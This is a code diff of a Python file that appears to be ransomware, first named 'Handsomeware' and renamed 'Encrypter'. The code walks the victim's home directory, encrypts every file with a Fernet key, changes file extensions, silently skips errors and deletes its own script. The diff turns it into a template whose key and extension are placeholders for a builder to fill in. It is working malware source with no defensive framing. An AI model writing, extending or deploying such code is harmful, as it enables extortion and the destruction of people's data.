@@ -2,15 +2,11 @@ import os
 from pathlib import Path
 from cryptography.fernet import Fernet
 
-class Handsomeware:
-    def __init__(self) -> None:
+class Encrypter:
+    def __init__(self,key,extension) -> None:
         self.home_dir = str(Path.home())
-    
-    def key(self):
-        self.key = Fernet.generate_key()
-
-        with open('key.txt','wb') as file:
-            file.write(self.key)
+        self.key = key
+        self.extension= extension
 
     def encrypt_files(self,file):
         fernet = Fernet(self.key)
@@ -30,7 +26,7 @@ class Handsomeware:
         new_name = file.replace(extension,new_extension)
         os.rename(file,new_name)
 
-    def start(self,extension):
+    def start(self):
         for rootdir, dirs, files in os.walk(self.home_dir):
             for subdir in dirs:
                 dir = os.path.join(rootdir, subdir)
@@ -40,7 +36,11 @@ class Handsomeware:
                             if os.path.isfile(files) == True:
                                 if "." in files:
                                     self.encrypt_files(files)
-                                    self.change_extension(files,extension)
+                                    if self.extension != '':
+                                        self.change_extension(files,self.extension)
                 except:
                     continue        
         os.remove(os.path.basename(__file__))        
+
+
+Encrypter({Key},"{FileExtension}").start()        
